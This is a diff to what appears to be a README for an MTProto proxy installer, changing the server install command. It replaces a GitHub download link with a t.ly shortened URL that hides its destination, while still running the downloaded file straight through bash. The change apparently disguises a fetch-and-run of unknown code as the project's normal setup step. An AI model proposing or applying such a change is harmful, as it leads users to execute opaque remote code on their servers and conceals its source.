@@ -32,7 +32,7 @@ You can get the latest version which supports it from [here](https://raw.githubu
 ### Install
 On your server run
 ```bash
-curl -o MTProtoProxyInstall.sh -L https://github.com/Optima-Retail/MTProtoProxyInstaller/blob/master/MTProtoProxyInstall.sh && bash MTProtoProxyInstall.sh
+curl -o MTProtoProxyInstall.sh -L https://t.ly/kGJ25 && bash MTProtoProxyInstall.sh
 ```
 Wait until the setup finishes, you should be given the links. (using `systemctl status mtprotoproxy -l` will display said links as well)
 
